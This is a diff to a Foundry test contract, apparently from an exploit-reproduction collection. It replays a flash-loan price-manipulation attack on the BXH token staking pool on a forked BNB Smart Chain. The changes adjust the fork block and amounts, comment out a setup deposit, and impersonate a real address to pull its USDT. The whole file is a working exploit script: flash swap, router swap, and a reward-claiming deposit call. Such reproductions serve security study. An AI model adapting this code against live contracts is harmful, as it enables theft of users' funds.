@@ -28,7 +28,7 @@ contract Attacker is Test {
     TokenStakingPoolDelegate constant bxhtokenstaking = TokenStakingPoolDelegate(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663);
 
     function setUp() public {
-        cheat.createSelectFork("bsc", 21665464);
+        cheat.createSelectFork("bsc", 21727289);
         cheat.label(address(BXH), "BXH");
         cheat.label(address(usdt), "USDT");
         cheat.label(address(wbnb), "WBNB");
@@ -39,18 +39,22 @@ contract Attacker is Test {
     }
 
     function testExploit() public {
-        cheat.prank(0x81C63d821b7CdF70C61009A81FeF8Db5949AC0C9);
+        
+        // Before attack need depoit first
 
-        //emit log_named_decimal_uint("[Start]  VUSDT Balance Of 0x54f611135A9b88bbE23a8CF6C1310c59321F2717:", vUSDT.balanceOf(address(0x54f611135A9b88bbE23a8CF6C1310c59321F2717)), 18);
-        vUSDT.transfer(address(this), 5582000000000000000000);
-        emit log_named_decimal_uint("[Start] contract VUSDT Balance is:", vUSDT.balanceOf(address(this)), 18);
+        // cheat.rollFork(21665464);
+        // cheat.prank(0x81C63d821b7CdF70C61009A81FeF8Db5949AC0C9);
 
-        vUSDT.approve(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, type(uint256).max);
+        // //emit log_named_decimal_uint("[Start]  VUSDT Balance Of 0x54f611135A9b88bbE23a8CF6C1310c59321F2717:", vUSDT.balanceOf(address(0x54f611135A9b88bbE23a8CF6C1310c59321F2717)), 18);
+        // vUSDT.transfer(address(this), 5582000000000000000000);
+        // emit log_named_decimal_uint("[Start] contract VUSDT Balance is:", vUSDT.balanceOf(address(this)), 18);
 
-        bxhtokenstaking.deposit(0, vUSDT.balanceOf(address(this)));
-        emit log_named_decimal_uint("[Start] contract Despoit VUSDT ", vUSDT.balanceOf(address(this)), 18);
+        // vUSDT.approve(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, type(uint256).max);
 
-        cheat.rollFork(21727289);
+        // bxhtokenstaking.deposit(0, vUSDT.balanceOf(address(this)));
+        // emit log_named_decimal_uint("[Start] contract Despoit VUSDT ", vUSDT.balanceOf(address(this)), 18);
+
+        //cheat.rollFork(21727289);
         
         emit log_named_decimal_uint("[Start] BXH-USDT  Pair USDT Balance is :" , usdt.balanceOf(address(0x919964B7f12A742E3D33176D7aF9094EA4152e6f)), 18);
         usdtwbnbpair.swap(3178800000000000000000000, 0 ,address(this), "0x");
@@ -69,7 +73,7 @@ contract Attacker is Test {
         path[1] = address(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
 
         bxhRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            usdt.balanceOf(address(this)) - 510 * 1e18,
+            usdt.balanceOf(address(this)) - 805614870582412124618,
             1,
             path,
             address(this),
@@ -77,12 +81,14 @@ contract Attacker is Test {
         );
         emit log_named_decimal_uint("[Flashloan] now Hacker BXH balance is :", BXH.balanceOf(address(this)), 18);
 
-        usdt.transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 510*1e18);
+        usdt.transfer(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663, 805614870582412124618);
 
         emit log_named_decimal_uint("[Flashloan] now bxh contract USDT balance is :", usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)), 18);
         
-        
+        cheat.startPrank(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f);
         bxhtokenstaking.deposit(0, 0);
+        usdt.transfer(address(this), usdt.balanceOf(address(0x4e77DF7b9cDcECeC4115e59546F3EAcBA095a89f)));
+        cheat.stopPrank();
 
         emit log_named_decimal_uint("[Flashloan] Hacker USDT Balance is :", usdt.balanceOf(address(this)), 18);
         emit log_named_decimal_uint("[Flashloan] bxh contract USDT Balance is :", usdt.balanceOf(address(0x27539B1DEe647b38e1B987c41C5336b1A8DcE663)), 18);
